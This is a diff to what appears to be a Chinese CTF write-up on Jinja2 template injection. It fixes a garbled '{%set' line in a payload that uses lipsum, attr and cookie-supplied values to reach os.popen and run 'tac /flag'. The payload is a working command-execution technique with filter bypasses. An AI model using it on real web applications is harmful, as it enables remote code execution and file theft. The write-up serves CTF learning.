@@ -357,10 +357,10 @@ Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 ```
 
-也可以用`{%set`来绕过
+也可以用`{百分号set`来绕过
 
 ```
-{%百分号et aaa=(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}{% print(aaa)%}
+{%set aaa=(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}{% print(aaa)%}
 
 Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 ```
